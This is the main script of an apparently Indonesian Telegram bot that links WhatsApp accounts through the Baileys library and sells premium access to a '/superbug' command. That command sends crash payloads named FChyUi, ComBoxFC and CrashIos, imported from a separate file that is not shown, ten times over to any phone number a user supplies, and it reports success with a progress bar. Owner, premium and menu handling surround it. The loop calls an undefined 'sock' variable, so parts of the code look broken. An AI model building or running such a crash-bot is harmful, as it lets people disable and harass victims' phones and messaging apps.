// === AUTH MODULE ===
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const axios = require("axios");
const P = require("pino");
const chalk = require("chalk");
const TelegramBot = require("node-telegram-bot-api");
// === CONFIG ===
const config = require("./config.js");
const BOT_TOKEN = config.BOT_TOKEN;

// === FUNCTION FILE ( BUG ) ===
const { ComBoxFC, CrashIos, FChyUi } = require("./function/func.js");

// === BAILEYS ===
const {
  default: makeWASocket,
  useMultiFileAuthState,
  useSingleFileAuthState,
  makeInMemoryStore,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  relayWAMessage,
  getContentType,
  mentionedJid,
  areJidsSameUser,
  jidDecode,
  processTime,
  WAMessageProto,
  WAProto,
  Browsers,
  Browser,
  BufferJSON,
  proto,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  WAMessageStatus,
  MessageOptions,
  MessageTypeProto,
  WALocationMessage,
  WAContextInfo,
  WAGroupMetadata,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  MediaType,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  AnyMessageContent,
  templateMessage,
  InteractiveMessage,
  Header,
  GroupMetadata,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  GroupSettingChange,
  DisconnectReason,
  ReconnectMode,
  WASocket,
  ProxyAgent,
  getStream,
  isBaileys,
  viewOnceMessage,
  groupStatusMentionMessage,
  waChatKey
} = require("@whiskeysockets/baileys");

// === DATABASE FILES ===
const PREMIUM_FILE = "./premium.json";
const ADMIN_FILE = "./admin.json";

// === STORAGE ===
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = [];
let adminUsers = [];

// === PASTIKAN FILE PREMIUM & ADMIN ADA ===
function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}
ensureFileExists(PREMIUM_FILE);
ensureFileExists(ADMIN_FILE);

// === LOAD DATA AWAL ===
function loadPremiumUsers() {
  try {
    return JSON.parse(fs.readFileSync(PREMIUM_FILE));
  } catch (error) {
    console.error("Error loading premium users:", error);
    return [];
  }
}

function loadAdminUsers() {
  try {
    return JSON.parse(fs.readFileSync(ADMIN_FILE));
  } catch (error) {
    console.error("Error loading admin users:", error);
    return [];
  }
}

premiumUsers = loadPremiumUsers();
adminUsers = loadAdminUsers();

// === FILE WATCHER ===
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

// === PANTAU FILE ===
watchFile(PREMIUM_FILE, (data) => (premiumUsers = data));
watchFile(ADMIN_FILE, (data) => (adminUsers = data));

// === SAVE PREMIUM ===
function savePremiumUsers(users) {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.error("Error saving premium users:", error);
  }
}

// === GET BUFFER ===
async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

// === EXPORT JIKA PERLU ===
module.exports = {
  premiumUsers,
  adminUsers,
  savePremiumUsers,
  getBuffer
};

// DATABASE
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/NPConTop/BOTALL/refs/heads/main/databasebot.json";
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Please Wait... Checking Tokens 😁"));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("🚫 𝚃𝙾𝙺𝙴𝙽 𝙱𝙴𝙻𝚄𝙼 𝚃𝙴𝚁𝙳𝙰𝙵𝚃𝙰𝚁...."));
    process.exit(1);
  }

  console.log(chalk.green(` 𝚃𝙾𝙺𝙴𝙽 𝚃𝙴𝚁𝙳𝙰𝙵𝚃𝙰𝚁...⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}
// === Start Bot ===
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(
    chalk.red(`
𝟷%                                  𝟻𝟶%
𝟻%                                  𝟻𝟻%
𝟷𝟶%                                 𝟼𝟶%
𝟷𝟻%                                 𝟼𝟻%
𝟸𝟶%             𝟷𝟶𝟶%              𝟽𝟶%
𝟸𝟻%                                 𝟽𝟻%
𝟹𝟶%                                 𝟾𝟶%
𝟹𝟻%                                 𝟾𝟻%
𝟺𝟶%                                 𝟿𝟶%
𝟺𝟻%                                 𝟿𝟻%
⋘ 𝑃𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡 – 𝑙𝑜𝑎𝑑𝑖𝑛𝑔 𝑑𝑎𝑡𝑎… ⋙ 
`)
  );

  console.log(
    chalk.red(`
[ 𝐓𝐎𝐊𝐄𝐍 𝐓𝐄𝐑𝐃𝐀𝐅𝐓𝐀𝐑 ® ]
`)
  );

  console.log(
    chalk.blue(`
⧽  𝙱𝙾𝚃 𝚁𝚄𝙽𝙽𝙸𝙽𝙶... ⧼
`)
  );
}

validateToken();
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
// RANDOM IMAGE
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/lw8gui.png",
    "https://files.catbox.moe/nke7l2.png",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

//SESSION AGAR BOT TERHUBUNG KE NOMOR WHATSAPP
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sanzy = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sanzy.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, sanzy);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sanzy.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

{}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sanzy = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sanzy.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sanzy.newsletterFollow("");// bebas mau ubah
      sanzy.newsletterFollow("");
      sanzy.newsletterFollow("");
      sessions.set(botNumber, sanzy);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`, 
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const costum = "XYSANZY9" // UBAH PAIRING CODE
          const code = await sanzy.requestPairingCode(botNumber, costum);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sanzy.ev.on("creds.update", saveCreds);

  return sanzy;
}
// [ ISI  FUNCTION AMPAS LU ]


//end function
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isPremium(userId) {
  try {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.includes(userId.toString());
  } catch (error) {
    console.error("Error checking premium status:", error);
    return false;
  }
}
// START
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `𝙷𝙰𝙻𝙾 𝙱𝚁𝙾 𝙺𝙴𝚃𝙸𝙺 /seventh 𝙱𝚄𝙰𝚃 𝙼𝙴𝙽𝚄 𝙽𝚈𝙰`);  
});

bot.onText(/\/info/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
  bot.sendMessage(chatId, ` 
┏───────────────────────┓
│ Nᴀᴍᴇ : ${senderName}
│ ID usᴇʀ : ${senderId}
┗───────────────────────┛`);
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
        
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah user adalah owner
  if (
    !isOwner(msg.from.id) 
  ) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "HTML" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let index = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${index}. ${botNumber}\n`;
      index++;
    }

    bot.sendMessage(
      chatId,
      `*Daftar Bot WhatsApp yang Terhubung:*\n${botList}`,
      { parse_mode: "HTML" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

// COMMAND BUG \\
bot.onText(/\/superbug (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙾𝚆𝙽𝙴𝚁", url: "https://t.me/SeventhQu" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/lw8gui.png",
      {
        caption: `
\`\`\`
╭━━『 𝙿𝚁𝙾𝙶𝚁𝙴𝚂𝚂 𝙱𝙰𝚁 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 10; i++) {
      await FChyUi(sock, jid);
      await FChyUi(sock, jid);
      await ComBoxFC(sock, jid);
      await ComBoxFC(sock, jid);
      await CrashIos(sock, jid);  
      await CrashIos(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝙿𝚁𝙾𝙶𝚁𝙴𝚂𝚂 𝙱𝙰𝚁 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// END CASE BUG
// BUTTONS MENU
const mainMenuButtons = {
  reply_markup: {
    inline_keyboard: [
      [{
         text: "OWNER MENU", 
         callback_data: "owner"
      },{ 
         text: "BUG MENU", 
         callback_data: "bugmenu" 
      },{
         text: "APA AJA", 
         callback_data: "apajamenu" 
      }],
      [{ 
         text: "Tanks - To", 
         callback_data: "tqto" 
      }],
      [{ 
         text: "ENCRYPTED MENU", 
         callback_data: "ENCUNLI" 
      }],
      [{ 
         text: "Semua Menu", 
         callback_data: "allmenu" 
      }],
    ],
  },
};

// BUTTON BACK
const menuWithBackButton = {
  reply_markup: {
    inline_keyboard: [
      [{ 
        text: "⬅️ Back",
        callback_data: "back" 
      }],
    ],
  },
};

function checkAndGetVideoPath(videoName) {
  const videoPath = path.join(
    __dirname, 
    "assets",
    "video",
    videoName
  );
  if (!fs.existsSync(videoPath)) {
    throw new Error("File video tidak ditemukan");
  }
  return videoPath;
}
// CASE MENU DLL
bot.onText(/\/zenith/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `𝚃𝚄𝙽𝙶𝙶𝚄 𝙱𝙴𝙱𝙴𝚁𝙰𝙿𝙰 𝙳𝙴𝚃𝙸𝙺. 𝙹𝙰𝙽𝙶𝙰𝙽 𝙳𝙸 𝚂𝙿𝙰𝙼!!`);  
});

bot.onText(/\/seventh/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const waktuRunPanel = getUptime();
  try {
     const videoPath = checkAndGetVideoPath("video.mp4");
    await bot.sendVideo(chatId, fs.createReadStream(videoPath), {
      caption: `\`\`\`╭━( 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗕𝗢𝗧 )
┃女 𝙽𝚊𝚖𝚎 : 𝚉𝚎𝚗𝚒𝚝𝚑 𝙾𝚏 𝚃𝚑𝚎 𝚂𝚎𝚟𝚎𝚗𝚝𝚑
┃女 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 𝟷𝟶 𝙾𝚠𝚗𝚎𝚛-𝙾𝚗𝚕𝚢
┃女 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 
┃女 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 :
┃女 𝚄𝚜𝚎𝚛 : ${chatId}
┃女 𝚄𝚜𝚎𝚛 𝙸𝙳 : ${senderId}
┃女 𝙾𝚠𝚗𝚎𝚛 : 
┃女 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``,
      parse_mode: "Markdown",
      ...mainMenuButtons,
    });
  } catch (error) {
    console.error("Error sending menu:", error);
    await bot.sendMessage(
      chatId,
      `\`\`\`
┃女 𝙽𝚊𝚖𝚎 : 𝚉𝚎𝚗𝚒𝚝𝚑 𝙾𝚏 𝚃𝚑𝚎 𝚂𝚎𝚟𝚎𝚗𝚝𝚑
┃女 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 𝟷𝟶 𝙾𝚠𝚗𝚎𝚛-𝙾𝚗𝚕𝚢
┃女 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 
┃女 𝚄𝚜𝚎𝚛 : ${chatId}
┃女 𝚄𝚜𝚎𝚛 𝙸𝙳 : ${senderId}
┃女 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``,
      {
        parse_mode: "Markdown",
        ...mainMenuButtons,
      }
    );
  }
});

bot.on("callback_query", async (query) => {
  await bot.answerCallbackQuery(query.id).catch(console.error);
  const waktuRunPanel = getUptime();
  const senderId = query.from.id;
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  let caption;
  let buttons;

  try {
    const videoPath = checkAndGetVideoPath("video.mp4");
    switch (query.data) {
      case "owner":
        caption = `\`\`\`
┏━━『 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /addbot
╿│☐ ⧽ /addprem >id<
╿│☐ ⧽ /delprem >id<
╿│☐ ⧽ /listprem
╿│☐ ⧽ /addowner >id<
╿│☐ ⧽ /delowner >i
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\``;
        buttons = menuWithBackButton;
        break;

       case "allmenu":
        caption = `\`\`\`
╭━( 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗕𝗢𝗧 )
┃女 𝙽𝚊𝚖𝚎 : 𝚉𝚎𝚗𝚒𝚝𝚑 𝙾𝚏 𝚃𝚑𝚎 𝚂𝚎𝚟𝚎𝚗𝚝𝚑
┃女 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 𝟷𝟶 𝙾𝚠𝚗𝚎𝚛-𝙾𝚗𝚕𝚢
┃女 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 
┃女 𝚄𝚜𝚎𝚛 : ${chatId}
┃女 𝚄𝚜𝚎𝚛 𝙸𝙳 : ${senderId}
┃女 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓

┏━━『 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /addbot
╿│☐ ⧽ /addprem >id<
╿│☐ ⧽ /delprem >id<
╿│☐ ⧽ /listprem
╿│☐ ⧽ /addowner >id<
╿│☐ ⧽ /delowner >i
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
  
┏━━『 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /
╿│☐ ⧽ /
╿│☐ ⧽ /
╿│☐ ⧽ /
╿│☐ ⧽ / 
╿│☐ ⧽ /
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━『 𝙵𝙸𝚃𝚄𝚁 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /info
╿│☐ ⧽ /listbot
╿│☐ ⧽ /siapa yang ciptain kamu?
╿│☐ ⧽ /
╿│☐ ⧽ / 
╿│☐ ⧽ / 
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━『 𝙴𝙽𝙲𝚁𝚈𝙿𝚃 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /SevenEnc
╿│☐ ⧽ 𝙺𝙴 @EncByNpc_bot
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\``;
        buttons = menuWithBackButton;
        break;

      case "bugmenu":
        caption = `\`\`\`
┏━━『 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /
╿│☐ ⧽ /
╿│☐ ⧽ /
╿│☐ ⧽ /
╿│☐ ⧽ / 
╿│☐ ⧽ /
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\``;
        buttons = menuWithBackButton;
        break;
        
      case "ENCUNLI":
        caption = `\`\`\`
╭┏━━『 𝙴𝙽𝙲𝚁𝚈𝙿𝚃 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /SevenEnc
╿│☐ ⧽ 𝙺𝙴 @EncByNpc_bot
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\``;   
        buttons = menuWithBackButton;
        break;
        
      case "apajamenu":
        caption = `\`\`\`
┏━━『 𝙵𝙸𝚃𝚄𝚁 𝙼𝙴𝙽𝚄 』
┃╭─────────────────
╿│☐ ⧽ /info
╿│☐ ⧽ /listbot
╿│☐ ⧽ /siapa yang ciptain kamu?
╿│☐ ⧽ /
╿│☐ ⧽ / 
╿│☐ ⧽ / 
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\``;
        buttons = menuWithBackButton;
        break;
case "tqto":
        caption = `\`\`\`
┏━━『  𝚃𝙷𝙰𝙽𝙺𝚂 𝚃𝙾 』
┃╭─────────────────
╿│☐ ⧽ 𝚂𝙴𝚅𝙴𝙽/𝙽𝙿𝙲 ( 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ) 
╿│☐ ⧽ 𝙾𝚁𝚃𝚄/𝙰𝙻𝙻𝙰𝙷 ( 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 ) 
╿│☐ ⧽ 𝚅𝙸𝙽𝙾 ( 𝙵𝚁𝙸𝙴𝙽𝙳 ) 
╿│☐ ⧽ 𝚁𝙰𝙿𝙸𝙰𝙷𝙼𝙰𝙳 ( 𝙵𝚁𝙸𝙴𝙽𝙳 ) 
╿│☐ ⧽ 𝙰𝚁𝙸 ( 𝙵𝚁𝙸𝙴𝙽𝙳 ) 
╿│☐ ⧽ 𝚁𝚄𝙰𝙽 𝙶𝙰𝙽𝙶𝚂𝚃𝙴𝚁 ( 𝙵𝚁𝙸𝙴𝙽𝙳 ) 
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\``;
        buttons = menuWithBackButton;
        break;
        
      case "back":
        caption = `\`\`\`
╭━( 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗕𝗢𝗧 )
